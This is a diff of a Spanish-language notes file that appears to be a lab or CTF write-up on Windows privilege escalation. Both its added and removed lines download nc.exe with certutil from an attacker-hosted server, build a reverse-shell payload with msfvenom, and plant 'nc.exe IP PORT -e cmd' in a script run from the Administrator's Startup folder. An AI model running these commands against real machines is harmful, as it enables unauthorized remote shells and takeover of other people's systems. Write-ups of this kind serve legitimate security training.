@@ -1,12 +1,27 @@
 Root.txt
 
+Una vez nos conectamos con de forma remota, abrimos una powershell y empezamos con la enumeracion y busqueda de alguna vulnerabilidad que nos permita realizar la escalada de privilegios.
 
+Miramos nuestros prvilegios:
+    - whoami /all
+    - net user username
+Pero no hay nada util, miramos los puertos, procesos, posibles servicios internos, etc. Pero nada.
 
-New-Item -ItemType HardLink -Path path\link.ps1 -Target path\x.ps1
-Usar certutil para descargar nc.exe:
-    certutil -urlcache -split -f http://IP:PORT/nc.exe
-    o
-    se puede crear: msfvenom -p windows/x64/powershell_reverse_tcp -ax64 LHOST=192.168.56.1 LPORT=443 -f exe > shell.exe
+Miramos ahora la start folder:
+    - cd  C:\Users\Administrador\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\StartUp\
 
-write-output "path\nc.exe 192.168.56.1 443 -e cmd" | set-content link.ps1
-Y cuando el admin ejecute lso archivos este tambien
+Hay un archivo. Este archivo se ejecuta cada vez que un usuario inicia sesion. Miramos su contenido, y vemos que ejecuta otro archivo. Vamos al directorio de ese otro archivo.
+Por suerte podemos ver su contenido, aunque no es relevante los comandos que ejecuta, miramo si podemos añadir informacion:
+    echo "#hola"
+
+y si hemos podido, quiere decir que tenemos privilegios de escritura.
+Vamos a intentar ejecutar un nc.
+
+Nos descargamos el nc.exe:
+    - En nuestro PC -> python3 -m http.server
+    - certutil -urlcache -split -f http://IP:PORT/nc.exe
+Si no tenemos el nc.exe, podemos crearnos uno con msfvenom:
+    - msfvenom -p windows/x64/powershell_reverse_tcp -ax64 LHOST=nuestra_IP LPORT=PORT -f exe > nc.exe
+
+Añadimos el comando al fichero:
+    - write-output "path\nc.exe IP PORT -e cmd" | set-content link.ps1
